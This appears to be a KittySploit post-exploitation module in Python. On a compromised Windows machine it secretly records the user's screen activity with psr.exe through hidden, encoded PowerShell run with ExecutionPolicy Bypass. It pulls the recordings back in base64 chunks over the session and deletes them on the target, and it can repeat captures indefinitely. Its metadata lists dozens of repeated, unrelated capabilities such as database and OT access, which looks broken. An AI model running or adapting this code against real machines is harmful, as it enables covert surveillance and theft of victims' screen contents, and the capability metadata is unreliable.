#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PSR (psr.exe) short recordings on the target; ZIP bytes are pulled through the Post session
and written under ./output (workspace-relative).
"""

from kittysploit import *
import base64
import os
import re
import time


# Post = active session; no separate exfil channel — artifacts land here.
_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows PSR capture",
        "description": (
            "Records a brief Problem Steps Recorder (psr.exe) session to a ZIP on the target, then downloads "
            "the file through the current session (base64 chunks) and saves it under ./output."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://learn.microsoft.com/windows-server/administration/windows-commands/psr",
        ],
        "tags": ["psr", "powershell", "screen"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    out_dir = OptString(r"C:\Temp", "Remote directory for temporary PSR ZIP files", False)
    record_seconds = OptInteger(10, "Seconds to record each PSR session before /stop", False)
    chunk_kb = OptInteger(100, "Chunk size in kilobytes for session reads", False)
    iterations = OptInteger(
        1,
        "Capture cycles (0 = run until you interrupt the module)",
        False,
    )
    no_profile = OptBool(True, "powershell -NoProfile", False)
    non_interactive = OptBool(True, "powershell -NonInteractive", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _powershell_prefix(self) -> str:
        parts = ["powershell.exe"]
        if self.no_profile:
            parts.append("-NoProfile")
        if self.non_interactive:
            parts.append("-NonInteractive")
        parts.extend(["-ExecutionPolicy", "Bypass"])
        return " ".join(parts)

    def _run_encoded(self, script: str) -> str:
        enc = self._encode_powershell(script)
        return self._execute_cmd(f"{self._powershell_prefix()} -EncodedCommand {enc}")

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _remote_capture_once(self) -> str:
        """Run one PSR cycle; return remote ZIP path or empty string."""
        out = self._ps_single_quote(str(self.out_dir or r"C:\Temp").strip())
        rec = max(1, self._int_opt(self.record_seconds, 10, None))
        marker = "__KS_PSR_PATH__:"
        ps = f"""$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Continue'
$outDir = '{out}'
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
$ts = Get-Date -Format 'yyyyMMddHHmmss'
$p = Join-Path $outDir ($ts + '.zip')
Start-Process -FilePath 'psr.exe' -ArgumentList '/start','/output',$p,'/gui','0' -WindowStyle Hidden
Start-Sleep -Seconds {rec}
Start-Process -FilePath 'psr.exe' -ArgumentList '/stop' -WindowStyle Hidden
$deadline = (Get-Date).AddMinutes(2)
while (-not (Test-Path -LiteralPath $p)) {{
  if ((Get-Date) -gt $deadline) {{ Write-Output '{marker}'; exit }}
  Start-Sleep -Seconds 1
}}
Write-Output ('{marker}' + $p)"""
        raw = self._run_encoded(ps)
        for line in raw.splitlines():
            line = line.strip()
            if line.startswith(marker):
                rest = line[len(marker) :].strip()
                return rest
        return ""

    def _remote_file_size(self, path: str) -> int:
        pq = self._ps_single_quote(path)
        ps = f"(Get-Item -LiteralPath '{pq}').Length"
        enc = self._encode_powershell(ps)
        out = self._execute_cmd(f"{self._powershell_prefix()} -EncodedCommand {enc}").strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self._ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self._run_encoded(ps)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def _remote_unlink(self, path: str) -> None:
        pq = self._ps_single_quote(path)
        ps = f"Remove-Item -LiteralPath '{pq}' -Force -ErrorAction SilentlyContinue"
        self._run_encoded(ps)

    def _pull_zip_via_session(self, remote_path: str, local_path: str) -> bool:
        size = self._remote_file_size(remote_path)
        if size <= 0:
            print_error("Remote ZIP is missing or empty after capture.")
            return False
        chunk = max(1024, self._int_opt(self.chunk_kb, 100, None) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self._read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset} (expected {n} bytes, got {len(blob)}).")
                return False
            parts.append(blob)
            offset += n
        data = b"".join(parts)
        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            try:
                os.makedirs(parent, exist_ok=True)
            except Exception:
                pass
        with open(local_path, "wb") as f:
            f.write(data)
        return True

    def check(self):
        ps = self._execute_cmd(
            'powershell.exe -NoProfile -Command "if (Test-Path $env:windir\\System32\\psr.exe) { 1 } else { 0 }"'
        )
        if "1" not in ps:
            print_error("psr.exe not found under System32 (unsupported SKU or missing binary).")
            return False
        print_success("psr.exe is present.")
        return True

    def run(self):
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        iters = self._int_opt(self.iterations, 1, 0)
        if iters == 0:
            print_warning("iterations=0: runs until you interrupt the module (Ctrl+C).")
        cycle = 0
        while True:
            if iters > 0 and cycle >= iters:
                break
            cycle += 1
            print_status(f"PSR capture cycle {cycle}" + (f"/{iters}" if iters > 0 else "") + "...")
            remote_zip = self._remote_capture_once()
            if not remote_zip:
                print_error("Could not obtain remote ZIP path (PSR failed or timed out).")
                return False
            base = os.path.basename(remote_zip.replace("\\", "/"))
            if not base or base == ".zip":
                base = f"psr_{int(time.time())}.zip"
            local_zip = os.path.join(_LOCAL_OUT, base)
            if not self._pull_zip_via_session(remote_zip, local_zip):
                self._remote_unlink(remote_zip)
                return False
            self._remote_unlink(remote_zip)
            rel = os.path.join(".", _LOCAL_OUT, base)
            print_success(f"Saved {rel} ({os.path.getsize(local_zip)} bytes)")
            time.sleep(1)
        return True
